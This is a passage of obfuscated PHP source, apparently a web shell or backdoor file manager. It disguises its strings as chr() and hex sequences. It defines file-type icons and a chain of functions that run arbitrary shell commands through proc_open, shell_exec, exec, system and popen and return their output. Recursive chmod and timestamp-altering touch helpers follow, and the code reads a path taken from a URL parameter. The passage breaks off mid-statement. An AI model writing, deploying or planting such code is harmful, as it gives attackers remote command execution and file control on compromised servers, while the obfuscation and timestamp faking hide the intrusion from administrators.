chr(49).chr(51).chr(46).chr(52).chr(48).chr(56).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(51).chr(52).chr(53).chr(57).chr(48).chr(50).chr(32).chr(55).chr(49).chr(55).chr(46).chr(57).chr(57).chr(50).chr(53).chr(44).chr(53).chr(55).chr(50).chr(46).chr(52).chr(54).chr(51).chr(50).chr(49).chr(32).chr(67).chr(55).chr(49).chr(57).chr(46).chr(57).chr(48).chr(56).chr(44).chr(53).chr(55).chr(49).chr(46).chr(57).chr(50).chr(56).chr(53).chr(57).chr(57).chr(32).chr(55).chr(50).chr(49).chr(46).chr(57).chr(54).chr(44).chr(53).chr(55).chr(49).chr(46).chr(54).chr(54).chr(50).chr(48).chr(52).chr(55).chr(32).chr(55).chr(50).chr(52).chr(46).chr(48).chr(48).chr(49).chr(53).chr(44).chr(53).chr(55).chr(49).chr(46).chr(54).chr(53).chr(49).chr(53).chr(48).chr(53).chr(32).chr(67).chr(55).chr(50).chr(54).chr(46).chr(48).chr(52).chr(44).chr(53).chr(55).chr(49).chr(46).chr(54).chr(54).chr(50).chr(48).chr(52).chr(55).chr(32).chr(55).chr(50).chr(56).chr(46).chr(48).chr(57).chr(51).chr(53).chr(44).chr(53).chr(55).chr(49).chr(46).chr(57).chr(50).chr(56).chr(53).chr(57).chr(57).chr(32).chr(55).chr(51).chr(48).chr(46).chr(48).chr(49).chr(48).chr(53).chr(44).chr(53).chr(55).chr(50).chr(46).chr(52).chr(54).chr(51).chr(50).chr(49).chr(32).chr(67).chr(55).chr(51).chr(52).chr(46).chr(53).chr(57).chr(49).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(51).chr(52).chr(53).chr(57).chr(48).chr(50).chr(32).chr(55).chr(51).chr(54).chr(46).chr(54).chr(48).chr(51).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(55).chr(51).chr(54).chr(46).chr(54).chr(48).chr(51).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(67).chr(55).chr(51).chr(55).chr(46).chr(57).chr(49).chr(50).chr(53).chr(44).chr(53).chr(55).chr(51).chr(46).chr(51).chr(49).chr(49).chr(48).chr(53).chr(56).chr(32).chr(55).chr(51).chr(55).chr(46).chr(48).chr(56).chr(57).chr(44).chr(53).chr(55).chr(53).chr(46).chr(55).chr(53).chr(57).chr(55).chr(50).chr(54).chr(32).chr(55).chr(51).chr(54).chr(46).chr(56).chr(52).chr(49).chr(53).chr(44).chr(53).chr(55).chr(54).chr(46).chr(51).chr(54).chr(57).chr(54).chr(51).chr(52).chr(32).chr(67).chr(55).chr(51).chr(56).chr(46).chr(51).chr(56).chr(48).chr(53).chr(44).chr(53).chr(55).chr(56).chr(46).chr(48).chr(53).chr(52).chr(55).chr(56).chr(56).chr(32).chr(55).chr(51).chr(57).chr(46).chr(51).chr(48).chr(57).chr(44).chr(53).chr(56).chr(48).chr(46).chr(50).chr(48).chr(53).chr(50).chr(55).chr(57).chr(32).chr(55).chr(51).chr(57).chr(46).chr(51).chr(48).chr(57).chr(44).chr(53).chr(56).chr(50).chr(46).chr(56).chr(51).chr(54).chr(49).chr(54).chr(55).chr(32).chr(67).chr(55).chr(51).chr(57).chr(46).chr(51).chr(48).chr(57).chr(44).chr(53).chr(57).chr(50).chr(46).chr(48).chr(57).chr(49).chr(55).chr(49).chr(50).chr(32).chr(55).chr(51).chr(51).chr(46).chr(54).chr(57).chr(55).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(49).chr(50).chr(57).chr(50).chr(53).chr(55).chr(32).chr(55).chr(50).chr(56).chr(46).chr(51).chr(53).chr(49).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(50).chr(53).chr(54).chr(49).chr(50).chr(32).chr(67).chr(55).chr(50).chr(57).chr(46).chr(50).chr(49).chr(50).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(52).chr(54).chr(57).chr(53).chr(52).chr(57).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(56).chr(48).chr(53).chr(44).chr(53).chr(57).chr(54).chr(46).chr(57).chr(51).chr(57).chr(51).chr(53).chr(51).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(56).chr(48).chr(53).chr(44).chr(53).chr(57).chr(57).chr(46).chr(49).chr(56).chr(55).chr(55).chr(51).chr(32).chr(67).chr(55).chr(50).chr(57).chr(46).chr(57).chr(56).chr(48).chr(53).chr(44).chr(54).chr(48).chr(50).chr(46).chr(52).chr(48).chr(56).chr(57).chr(52).chr(57).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(53).chr(48).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(48).chr(48).chr(54).chr(55).chr(48).chr(54).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(53).chr(48).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(55).chr(57).chr(55).chr(51).chr(50).chr(56).chr(32).chr(67).chr(55).chr(50).chr(57).chr(46).chr(57).chr(53).chr(48).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(52).chr(52).chr(49).chr(56).chr(55).chr(51).chr(32).chr(55).chr(51).chr(48).chr(46).chr(51).chr(56).chr(50).chr(53).chr(44).chr(54).chr(48).chr(55).chr(46).chr(49).chr(57).chr(49).chr(56).chr(51).chr(52).chr(32).chr(55).chr(51).chr(49).chr(46).chr(54).chr(48).chr(48).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(57).chr(53).chr(53).chr(52).chr(32).chr(67).chr(55).chr(52).chr(49).chr(46).chr(49).chr(51).chr(44).chr(54).chr(48).chr(51).chr(46).chr(55).chr(54).chr(50).chr(55).chr(57).chr(52).chr(32).chr(55).chr(52).chr(56).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(51).chr(55).chr(54).chr(53).chr(57).chr(32).chr(55).chr(52).chr(56).chr(44).chr(53).chr(56).chr(52).chr(46).chr(48).chr(57).chr(54).chr(54).chr(52).chr(52).chr(32).chr(67).chr(55).chr(52).chr(56).chr(44).chr(53).chr(55).chr(48).chr(46).chr(55).chr(56).chr(55).chr(48).chr(57).chr(50).chr(32).chr(55).chr(51).chr(55).chr(46).chr(50).chr(53).chr(52).chr(44).chr(53).chr(54).chr(48).chr(32).chr(55).chr(50).chr(51).chr(46).chr(57).chr(57).chr(56).chr(53).chr(44).chr(53).chr(54).chr(48).chr(34).chr(47).chr(62).chr(60).chr(47).chr(103).chr(62).chr(60).chr(47).chr(103).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        "\x69\x6d\x67" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(53).chr(104).chr(49).chr(54).chr(118).chr(49).chr(52).chr(72).chr(52).chr(122).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(99).chr(105).chr(114).chr(99).chr(108).chr(101).chr(32).chr(99).chr(120).chr(61).chr(34).chr(56).chr(46).chr(53).chr(34).chr(32).chr(99).chr(121).chr(61).chr(34).chr(57).chr(46).chr(53).chr(34).chr(32).chr(114).chr(61).chr(34).chr(49).chr(46).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(49).chr(54).chr(108).chr(52).chr(45).chr(52).chr(32).chr(51).chr(32).chr(51).chr(32).chr(51).chr(45).chr(50).chr(32).chr(54).chr(32).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(99).chr(97).chr(112).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(112).chr(100).chr(102) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x36\x20\x33\x68\x37\x6c\x35\x20\x35\x76\x31\x31\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x74\x65\x78\x74\x20\x78\x3d\x22\x37\x22\x20\x79\x3d\x22\x31\x37\x22\x20\x66\x6f\x6e\x74\x2d\x73\x69\x7a\x65\x3d\x22\x38\x22\x20\x66\x6f\x6e\x74\x2d\x66\x61\x6d\x69\x6c\x79\x3d\x22\x75\x69\x2d\x73\x61\x6e\x73\x2d\x73\x65\x72\x69\x66\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x3e\x50\x44\x46\x3c\x2f\x74\x65\x78\x74\x3e\x3c\x2f\x73\x76\x67\x3e",
        chr(115).chr(104).chr(101).chr(101).chr(116) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_c4f9f0 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(54).chr(32).chr(51).chr(104).chr(49).chr(50).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(50).chr(32).chr(50).chr(118).chr(49).chr(52).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(32).chr(50).chr(72).chr(54).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(45).chr(50).chr(86).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(56).chr(32).chr(56).chr(104).chr(56).chr(77).chr(56).chr(32).chr(49).chr(50).chr(104).chr(56).chr(77).chr(56).chr(32).chr(49).chr(54).chr(104).chr(56).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        "\x7a\x69\x70" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_c4f9f0 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(54).chr(32).chr(51).chr(104).chr(55).chr(108).chr(53).chr(32).chr(53).chr(118).chr(49).chr(49).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(32).chr(50).chr(72).chr(54).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(45).chr(50).chr(86).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(49).chr(49).chr(32).chr(53).chr(104).chr(50).chr(118).chr(50).chr(104).chr(45).chr(50).chr(118).chr(50).chr(104).chr(50).chr(118).chr(50).chr(104).chr(45).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        "\x64\x62" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . "\x22\x3e\x3c\x65\x6c\x6c\x69\x70\x73\x65\x20\x63\x78\x3d\x22\x31\x32\x22\x20\x63\x79\x3d\x22\x36\x22\x20\x72\x78\x3d\x22\x38\x22\x20\x72\x79\x3d\x22\x33\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x34\x20\x36\x76\x31\x32\x63\x30\x20\x31\x2e\x37\x20\x33\x2e\x36\x20\x33\x20\x38\x20\x33\x73\x38\x2d\x31\x2e\x33\x20\x38\x2d\x33\x56\x36\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x73\x65\x61\x72\x63\x68" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_c4f9f0 . "\x22\x3e\x3c\x63\x69\x72\x63\x6c\x65\x20\x63\x78\x3d\x22\x31\x31\x22\x20\x63\x79\x3d\x22\x31\x31\x22\x20\x72\x3d\x22\x37\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x32\x30\x20\x32\x30\x6c\x2d\x33\x2d\x33\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
    );
    $_1810e4[$_c4f9f0] = $_25df3d;
    return isset($_25df3d[$_bc4c7b]) ? $_25df3d[$_bc4c7b] : $_25df3d["\x66\x69\x6c\x65"];
}
function _f05360a54($_36defd)
{
    if (is_dir($_36defd))
        return _f04034bc2(chr(102).chr(111).chr(108).chr(100).chr(101).chr(114));
    $_62af60 = strtolower(pathinfo($_36defd, PATHINFO_EXTENSION));
    if (in_array($_62af60, array(chr(122).chr(105).chr(112), "\x72\x61\x72", chr(55).chr(122))))
        return _f04034bc2("\x7a\x69\x70");
    if (in_array($_62af60, array(chr(106).chr(112).chr(103), "\x6a\x70\x65\x67", chr(112).chr(110).chr(103), chr(103).chr(105).chr(102), chr(119).chr(101).chr(98).chr(112), "\x62\x6d\x70", chr(115).chr(118).chr(103))))
        return _f04034bc2("\x69\x6d\x67");
    if (in_array($_62af60, array(chr(112).chr(100).chr(102))))
        return _f04034bc2(chr(112).chr(100).chr(102));
    if (in_array($_62af60, array("\x63\x73\x76", "\x78\x6c\x73", "\x78\x6c\x73\x78")))
        return _f04034bc2("\x73\x68\x65\x65\x74");
    if (in_array($_62af60, array("\x73\x71\x6c")))
        return _f04034bc2("\x64\x62");
    if (in_array($_62af60, array(chr(112).chr(104).chr(112), chr(106).chr(115), "\x74\x73", "\x63\x73\x73", chr(115).chr(99).chr(115).chr(115), "\x6c\x65\x73\x73", "\x68\x74\x6d\x6c", "\x68\x74\x6d", "\x78\x6d\x6c", "\x79\x6d\x6c", chr(121).chr(97).chr(109).chr(108), "\x69\x6e\x69", "\x63\x66\x67")))
        return _f04034bc2("\x63\x6f\x64\x65");
    if (in_array($_62af60, array("\x74\x78\x74", "\x6d\x64", chr(108).chr(111).chr(103), chr(106).chr(115).chr(111).chr(110))))
        return _f04034bc2(chr(116).chr(101).chr(120).chr(116));
    return _f04034bc2("\x66\x69\x6c\x65");
}


if (!function_exists("\x6d\x61\x6b\x65\x5f\x63\x64\x5f\x70\x72\x65\x66\x69\x78")) {
    function make_cd_prefix($_e159f9)
    {
        if (!$_e159f9)
            return '';
        if (DIRECTORY_SEPARATOR === "\x5c")
            return chr(99).chr(100).chr(32).chr(47).chr(100).chr(32) . escapeshellarg($_e159f9) . "\x20\x26\x26\x20";
        return chr(99).chr(100).chr(32) . escapeshellarg($_e159f9) . chr(32).chr(38).chr(38).chr(32);
    }
}
if (!function_exists("\x77\x72\x61\x70\x5f\x63\x6d\x64\x5f\x66\x6f\x72\x5f\x73\x68\x65\x6c\x6c")) {
    function wrap_cmd_for_shell($_7a966e)
    {
        if (DIRECTORY_SEPARATOR === chr(92))
            return "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x43\x20" . $_7a966e;
        return chr(47).chr(98).chr(105).chr(110).chr(47).chr(115).chr(104).chr(32).chr(45).chr(99).chr(32) . escapeshellarg($_7a966e);
    }
}


if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110))) {
    function run_with_proc_open($_7a966e, $_e159f9 = null, $_fc917d = 30)
    {
        if (!is_fn_usable(chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110)))
            return null;
        $_66b194 = array(0 => array("\x70\x69\x70\x65", "\x72"), 1 => array(chr(112).chr(105).chr(112).chr(101), "\x77"), 2 => array(chr(112).chr(105).chr(112).chr(101), chr(119)));
        $_58bb9b = array();
        $_84bca2 = @proc_open($_7a966e, $_66b194, $_58bb9b, $_e159f9 ?: null, null);
        if (!is_resource($_84bca2))
            return null;
        if (isset($_58bb9b[1]) && is_resource($_58bb9b[1]))
            @stream_set_blocking($_58bb9b[1], false);
        if (isset($_58bb9b[2]) && is_resource($_58bb9b[2]))
            @stream_set_blocking($_58bb9b[2], false);
        if (isset($_58bb9b[0]) && is_resource($_58bb9b[0]))
            @fclose($_58bb9b[0]);
        $_4c9718 = '';
        $_3cf9a0 = time();
        while (true) {
            $_c7d4f0 = @proc_get_status($_84bca2);
            $_a63dad = $_c7d4f0 && !empty($_c7d4f0[chr(114).chr(117).chr(110).chr(110).chr(105).chr(110).chr(103)]);
            $_ab6f7c = array();
            if (isset($_58bb9b[1]) && is_resource($_58bb9b[1]))
                $_ab6f7c[] = $_58bb9b[1];
            if (isset($_58bb9b[2]) && is_resource($_58bb9b[2]))
                $_ab6f7c[] = $_58bb9b[2];
            if ($_ab6f7c) {
                $_16a1d4 = null;
                $_62af60 = null;
                @stream_select($_ab6f7c, $_16a1d4, $_62af60, 1);
                foreach ($_ab6f7c as $_36defd) {
                    $_6eb815 = @fread($_36defd, 8192);
                    if ($_6eb815 !== false && $_6eb815 !== '')
                        $_4c9718 .= $_6eb815;
                }
            }
            else {
                usleep(100000);
            }
            if (!$_a63dad)
                break;
            if ($_fc917d > 0 && (time() - $_3cf9a0) >= $_fc917d) {
                @proc_terminate($_84bca2, 9);
                foreach ($_58bb9b as $_36defd) {
                    if (is_resource($_36defd))
                        @fclose($_36defd);
                }
                @proc_close($_84bca2);
                return array("\x6d\x65\x74\x68\x6f\x64" => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e", "\x63\x6f\x64\x65" => 124, "\x6f\x75\x74" => $_4c9718 . "\n[timeout after {$_fc917d}s]");
            }
        }
        foreach ($_58bb9b as $_36defd) {
            if (is_resource($_36defd))
                @fclose($_36defd);
        }
        $_722b51 = @proc_close($_84bca2);
        if ($_722b51 === -1)
            $_722b51 = null;
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110), "\x63\x6f\x64\x65" => $_722b51, "\x6f\x75\x74" => $_4c9718);
    }
}
if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function run_with_shell_exec($_7a966e, $_e159f9 = null)
    {
        if (!is_fn_usable(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)))
            return null;
        $_3e9f1a = make_cd_prefix($_e159f9) . $_7a966e . "\x20\x32\x3e\x26\x31";
        $_862fdd = @shell_exec($_3e9f1a);
        if ($_862fdd === null)
            return null;
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99), "\x63\x6f\x64\x65" => null, chr(111).chr(117).chr(116) => $_862fdd);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x65\x78\x65\x63")) {
    function run_with_exec($_7a966e, $_e159f9 = null)
    {
        if (!is_fn_usable("\x65\x78\x65\x63"))
            return null;
        $_3e9f1a = make_cd_prefix($_e159f9) . $_7a966e . "\x20\x32\x3e\x26\x31";
        $_dcb56a = array();
        $_722b51 = 0;
        @exec($_3e9f1a, $_dcb56a, $_722b51);
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => chr(101).chr(120).chr(101).chr(99), chr(99).chr(111).chr(100).chr(101) => $_722b51, "\x6f\x75\x74" => implode("\x0a", (array)$_dcb56a));
    }
}
if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109))) {
    function run_with_system($_7a966e, $_e159f9 = null)
    {
        if (!is_fn_usable("\x73\x79\x73\x74\x65\x6d"))
            return null;
        $_3e9f1a = make_cd_prefix($_e159f9) . $_7a966e . "\x20\x32\x3e\x26\x31";
        ob_start();
        @system($_3e9f1a, $_722b51);
        $_862fdd = ob_get_clean();
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), "\x63\x6f\x64\x65" => $_722b51, chr(111).chr(117).chr(116) => $_862fdd);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x70\x6f\x70\x65\x6e")) {
    function run_with_popen($_7a966e, $_e159f9 = null)
    {
        if (!is_fn_usable("\x70\x6f\x70\x65\x6e"))
            return null;
        $_3e9f1a = make_cd_prefix($_e159f9) . $_7a966e . "\x20\x32\x3e\x26\x31";
        $_84c87b = @popen(wrap_cmd_for_shell($_3e9f1a), "\x72");
        if (!is_resource($_84c87b))
            return null;
        $_4c9718 = "";
        while (!feof($_84c87b)) {
            $_6eb815 = @fread($_84c87b, 8192);
            if ($_6eb815 === false)
                break;
            $_4c9718 .= $_6eb815;
        }
        @pclose($_84c87b);
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => "\x70\x6f\x70\x65\x6e", chr(99).chr(111).chr(100).chr(101) => null, chr(111).chr(117).chr(116) => $_4c9718);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x63\x6f\x6d\x6d\x61\x6e\x64\x5f\x61\x6c\x6c")) {
    function run_command_all($_7a966e, $_e159f9 = null)
    {
        $_65706d = run_with_proc_open($_7a966e, $_e159f9, 30);
        if ($_65706d)
            return $_65706d;
        $_44d17b = array(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99), chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(101).chr(120).chr(101).chr(99), chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(112).chr(111).chr(112).chr(101).chr(110));
        foreach ($_44d17b as $_ba896e) {
            if (function_exists($_ba896e)) {
                $_560e65 = $_ba896e($_7a966e, $_e159f9);
                if ($_560e65)
                    return $_560e65;
            }
        }
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => "\x6e\x6f\x6e\x65", "\x63\x6f\x64\x65" => 127, chr(111).chr(117).chr(116) => "\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x72\x75\x6e\x6e\x65\x72\x20\x6e\x6f\x74\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x50\x48\x50\x20\x62\x75\x69\x6c\x64\x2e");
    }
}


function _f177b28ac($_013f0a, $_4ada7a, $_295c11, &$_c3adcc)
{
    if (!@chmod($_013f0a, $_4ada7a))
        $_c3adcc = false;
    if ($_295c11 && is_dir($_013f0a)) {
        $_84c87b = @opendir($_013f0a);
        if ($_84c87b !== false) {
            while (false !== ($_c4bf7e = readdir($_84c87b))) {
                if ($_c4bf7e === "\x2e" || $_c4bf7e === "\x2e\x2e")
                    continue;
                _f177b28ac($_013f0a . DIRECTORY_SEPARATOR . $_c4bf7e, $_4ada7a, true, $_c3adcc);
            }
            closedir($_84c87b);
        }
        else {
            $_c3adcc = false;
        }
    }
}
function _f5b82abde($_013f0a, $_124a80, $_295c11, &$_c3adcc)
{
    if (!@touch($_013f0a, $_124a80, $_124a80))
        $_c3adcc = false;
    if ($_295c11 && is_dir($_013f0a)) {
        $_84c87b = @opendir($_013f0a);
        if ($_84c87b !== false) {
            while (false !== ($_c4bf7e = readdir($_84c87b))) {
                if ($_c4bf7e === chr(46) || $_c4bf7e === "\x2e\x2e")
                    continue;
                _f5b82abde($_013f0a . DIRECTORY_SEPARATOR . $_c4bf7e, $_124a80, true, $_c3adcc);
            }
            closedir($_84c87b);
        }
        else {
            $_c3adcc = false;
        }
    }
}


$_2c22b0 = isset($_GET["\x70"]) ? (string)$_GET["\x70"] : getcwd();
if (!is_dir($_2c22b0))
